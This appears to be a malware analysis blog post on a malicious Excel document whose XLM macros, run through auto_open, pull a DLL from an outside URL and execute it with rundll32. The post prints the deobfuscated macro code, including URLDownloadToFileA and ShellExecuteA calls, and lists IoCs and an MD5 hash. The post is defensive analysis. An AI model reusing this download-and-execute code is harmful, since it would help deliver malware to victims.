---
title: Excel Downlaoder
date: 2023-05-19 00:00:00 +0800
categories: [Malware, Downloader]
tags: [real_sample, excel, xlm, macro]
toc: true
---

#xls #malware #macros #xlm_macros #downloader 

# Basic info 
MD5: `d7468f3bfae912928bdf3b8ddc0d8ff9`
file info: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: vlcqBjjWJkHThPgSWv, Last Saved By: Company, Name of Creating Application: Microsoft Macintosh Excel, Create Time/Date: M  
on Nov 23 13:55:34 2020, Last Saved Time/Date: Mon Nov 23 14:13:13 2020

# Analysis
We start by a excel file

Checking it using `oleid` 

![image 1](/assets/img/posts/excel_downloader/1.png)


the file contains a xlm macros

Now open the file in excel and make sure that macros not enabled

![image 2](/assets/img/posts/excel_downloader/2.png)

notice that the file contains 2 sheets and it has a social engineering message to make the user enable macros

open the second sheet and go to the auto_open cell 

![image 3](/assets/img/posts/excel_downloader/3.png)

this will be the start of xlm macros

now i will continue as static analysis without running the macro just for my personal training 
i will copy all the codes to vs code and start manual deobfuscation

![image 4](/assets/img/posts/excel_downloader/4.png)

it is clear that it will start build up strings like this url 

```c
url = "https://tophomedesignz.com/sport.dll"
cmd = "C:\rxtGJXs\uEOIlCU\URLdaxT.dll,DllRegisterServer"
path = "C:\rxtGJXs\uEOIlCU\URLdaxT.dll"
urlmon = "URLMON"
downloadtofile = "URLDownloadToFileA"
shell32 = "Shell32"
shell_exec ="ShellExecuteA"
open = "Open"
CJyenomr = "regsvr32.exe"
rundll32 = "rundll32.exe"
dir1 = "C:\rxtGJxs"
subdir1 = "C:\rxtGJxs\uEOIlCU"
krnl32 = "kernel32"
mkdir = "CreateDirectoryA"
QRbytXZ = "INSEGN"
CIbjZFzB = "DownloadFile"
cHFnbvmd = "zbaqgiaz"
dGZFcuHu = "BLttghIR"
BMdezBL = "YSKhEnyF"
JCJ = "JCJ"
JJCCJJ = "JJCCJJ"
JJCCCCJ = "JJCCCCJ"

=CALL(krnl32,mkdir,JCJ,dir1,0)
=CALL(krnl32,mkdir,JCJ,subdir1,0)
=CALL(urlmon,downloadtofile,JJCCJJ,0,URL,path,0,0)
=CALL(shell32,shell_exec,JJCCCCJ,0,open,rundll32,cmd,0,0)

=HALT()
```


The excel file will do the following:
1. create a directory `C:\rxtGJxs\uEOIlCU`
2. download the dll from `https://tophomedesignz.com/sport.dll` at `C:\rxtGJXs\uEOIlCU\URLdaxT.dll` 
3. run the dll `C:\rxtGJXs\uEOIlCU\URLdaxT.dll,DllRegisterServer`



# IoC

## Host Based IoC

DLL location  `C:\rxtGJXs\uEOIlCU\URLdaxT.dll`

## Network Based IoC

URL  `https://tophomedesignz.com/sport.dll`
